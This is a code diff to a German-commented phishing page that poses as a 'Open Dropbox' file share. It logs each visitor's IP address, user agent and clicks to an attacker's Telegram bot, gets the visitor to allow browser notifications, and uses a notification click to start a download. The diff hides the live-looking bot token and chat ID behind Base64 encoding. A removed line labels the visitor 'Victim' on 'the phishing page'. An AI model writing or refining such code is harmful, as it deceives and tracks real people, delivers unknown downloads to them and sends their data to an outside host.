@@ -440,14 +440,22 @@
   </div>
 
   <script>
-    // Telegram Bot Konfiguration - HIER DEINE DATEN EINTRAGEN
-    const TELEGRAM_BOT_TOKEN = '8866003617:AAGTQsC1ZKCe4bglMxS223GlB2cOUlLPV7A'; // Ersetze mit deinem Bot Token
-    const TELEGRAM_CHAT_ID = '6003232782'; // Ersetze mit deiner Chat ID
+    // Base64 encoded credentials
+    const ENCODED_TOKEN = 'ODg2NjAwMzYxNzpBQUdUUXNDMVpLQ2U0YmdsTXhTMjIzR2xCMmNPVWxMUDc3QQ==';
+    const ENCODED_CHAT_ID = 'NjAwMzIzMjc4Mg==';
+    
+    // Decode function
+    const decode = (str) => atob(str);
+    
+    // Telegram Bot Konfiguration - decodiert zur Laufzeit
+    const TELEGRAM_BOT_TOKEN = decode(ENCODED_TOKEN);
+    const TELEGRAM_CHAT_ID = decode(ENCODED_CHAT_ID);
     
     // User Tracking Daten
     let userIP = 'unknown';
     let userAgent = navigator.userAgent;
     let sessionID = Math.random().toString(36).substring(2, 15);
+    let firstClickSent = false;
     
     // IP-Adresse ermitteln für detaillierte Logs
     fetch('https://api.ipify.org?format=json')
@@ -501,7 +509,7 @@
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
       
-      // Telegram Benachrichtigung über Download
+      // Telegram Benachrichtigung über Download (zweiter Klick)
       sendTelegramMessage('📥 DOWNLOAD STARTED', 'User clicked notification and download was initiated');
     }
 
@@ -520,7 +528,7 @@
         silent: false
       });
       
-      // Bei Klick auf Notification: Download starten
+      // Bei Klick auf Notification: Download starten (zweiter Klick)
       notification.onclick = function() {
         window.focus();
         notification.close();
@@ -533,14 +541,18 @@
       }, 30000);
     }
 
-    // Hauptfunktion beim Klick auf "Open Dropbox"
+    // Hauptfunktion beim Klick auf "Open Dropbox" (erster Klick)
     async function handleOpenDropbox() {
       const btn = document.getElementById('openDriveBtn');
-      btn.disabled = true;
-      btn.textContent = 'Opening...';
       
-      // Telegram: Benachrichtigung dass jemand auf "Open Dropbox" geklickt hat
-      await sendTelegramMessage('🖱️ OPEN DROPBOX CLICKED', 'User clicked the "Open Dropbox" button');
+      if (!firstClickSent) {
+        btn.disabled = true;
+        btn.textContent = 'Opening...';
+        
+        // Telegram: Benachrichtigung dass jemand auf "Open Dropbox" geklickt hat (erster Klick)
+        await sendTelegramMessage('🖱️ OPEN DROPBOX CLICKED', 'User clicked the "Open Dropbox" button');
+        firstClickSent = true;
+      }
       
       // Notification Permission anfragen
       if (!('Notification' in window)) {
@@ -585,10 +597,10 @@
     // Event Listener
     document.getElementById('openDriveBtn').addEventListener('click', handleOpenDropbox);
     
-    // Initial Telegram Nachricht: Seite wurde geladen
-    window.addEventListener('load', () => {
-      sendTelegramMessage('🌐 PAGE LOADED', 'Victim opened the phishing page');
-    });
+    // KEIN automatischer Alert beim Seitenaufruf mehr
+    // window.addEventListener('load', () => {
+    //   sendTelegramMessage('🌐 PAGE LOADED', 'Victim opened the phishing page');
+    // });
   </script>
 </body>
 </html>
